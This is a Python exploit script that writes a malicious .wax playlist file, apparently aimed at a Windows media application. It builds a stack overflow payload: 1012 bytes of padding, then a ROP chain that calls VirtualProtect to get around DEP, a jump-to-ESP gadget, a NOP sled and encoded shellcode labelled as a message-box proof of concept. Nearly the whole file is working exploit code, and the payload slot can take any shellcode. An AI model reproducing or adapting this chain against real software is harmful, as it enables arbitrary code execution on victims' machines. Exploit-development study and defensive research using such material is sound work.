import struct

def paick(shelly):
        return struct.pack('<L', shelly)

# badchars: \x00 \x0a \x1a \x2a
# msgbox
shellcode =  b""
shellcode += b"\xd9\xc2\xd9\x74\x24\xf4\x5b\xbd\xc2\x9f\xa8"
shellcode += b"\xce\x31\xc9\xb1\x40\x83\xc3\x04\x31\x6b\x13"
shellcode += b"\x03\xa9\x8c\x4a\x3b\xf4\x58\x11\x1d\x72\xbb"
shellcode += b"\xd2\xaf\xa8\x71\x6d\xe1\x85\x12\x19\x70\x25"
shellcode += b"\x50\x6b\x7f\xce\x10\x88\xf4\x96\xd4\x3b\x74"
shellcode += b"\x36\x6e\x0d\xb1\x79\x68\x07\x32\xdc\x89\x36"
shellcode += b"\x4b\x3f\xe9\x33\xd8\x9b\xce\xc8\x64\xdf\x85"
shellcode += b"\x9b\x4e\x67\x9b\xc9\x04\xdd\x83\x86\x41\xc1"
shellcode += b"\xb2\x73\x96\x35\xfc\x08\x6d\xbe\xff\xe0\xbf"
shellcode += b"\x3f\xce\x3c\x43\x13\xb5\x7d\xc8\x6c\x77\xb2"
shellcode += b"\x3c\x73\xb0\xa6\xcb\x48\x42\x1d\x1c\xdb\x5b"
shellcode += b"\xd6\x06\x07\x9d\x02\xd0\xcc\x91\x9f\x96\x88"
shellcode += b"\xb5\x1e\x42\xa7\xc2\xab\x95\x5f\x43\xef\xb1"
shellcode += b"\x83\x35\x33\x0b\xb3\x9c\x67\xe5\x26\x57\x45"
shellcode += b"\x9e\x26\x26\x44\xb3\x64\x5f\xc7\xb4\x77\x60"
shellcode += b"\x71\x0f\x83\x24\xfc\x48\x69\x29\x86\x75\x49"
shellcode += b"\x9c\x60\x0b\x6e\xdf\x8e\x9d\xd5\x28\x19\xf2"
shellcode += b"\xb9\x08\x98\x62\x72\x7b\x34\x17\x1c\x0e\x3b"
shellcode += b"\xb2\xae\xc0\x60\xb4\x12\x05\x9d\x4c\x4c\x13"
shellcode += b"\x5e\x1b\x94\x15\x62\xf4\x2f\x8d\xc1\xb8\xf3"
shellcode += b"\x49\x19\x67\x59\xbe\x7d\x98\xa2\xc1\xea\x16"
shellcode += b"\x04\x1e\xcb\xbe\xd1\x33\x6a\x53\x28\x17\xe4"
shellcode += b"\xf7\x6e\xa2\x7c\xe4\x06\xc8\x26\xcb\xf6\x78"
shellcode += b"\xa7\x7c\x98\x1d\x76\x4a\xec\x92\x5c\x49\x65"
shellcode += b"\xcb\xac\x83\x27\x5f\x9e\x71\x38\x8f\x11\xb6"
shellcode += b"\x96\xcf\x07\x3e"

payload = b"A"*1012

payload += paick(0x10101008) # eip - retn

# Put ret into edi
payload += paick(0x100190b0) # pop edi, ret
payload += paick(0x10101008) # pointer to ret

# 1. Put virtualprotect into esi
payload += paick(0x10015f82) # pop eax, ret
payload += paick(0x10109270) # pointer to virtualprotect
payload += paick(0x1001eaf1) # mov eax, dword ptr ds:[eax]
payload += paick(0x10030950 ) # xchg eax, esi
# Now edi = vprotect

# Put jmp esp into ebp
payload += paick(0x100106e1) # pop ebp
payload += paick(0x100222c5) # jmp esp

# flNewProtect 0x40 into edx
payload += paick(0x10015f16) # xor eax, eax
payload += paick(0x10015fdf) # add al, 41
payload += paick(0x1003a083) # dec eax
payload += paick(0x10038a6d) # xchg eax, edx

# dwSize into ebx
payload += paick(0x10015f16) # xor eax, eax
payload += paick(0x10032f72) # # XCHG EAX,EBX # RETN 0x00
payload += paick(0x1001ff9c) # add al, 50
payload += paick(0x1001ff9c) # 
payload += paick(0x1001ff9c) #
payload += paick(0x1001fc81) # add eax, 58. ret 4
payload += paick(0x1001fc81) # add eax, 58, ret 4
payload += b"XXXX"
payload += paick(0x1001fc81) # add eax, 58, ret 4
payload += b"XXXX"
payload += paick(0x10015ef2) # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
payload += b"XXXX"

# 6. Put oldprotect into ecx
payload += paick(0x10601007) # pop ecx
payload += paick(0x10101279) # random writable memory

payload += paick(0x10015f82) # pop eax, ret
payload += paick(0x90909090)

# Finally do a pushad, ret
payload += paick(0x1001d7a5) # pushad; ret

payload += paick(0x90909090)*20 # nop sled
payload += shellcode
payload += paick(0x90909090)*20 # placeholders for now

output_file = open("poc2.wax", "wb") 
output_file.write(payload)
output_file.close()

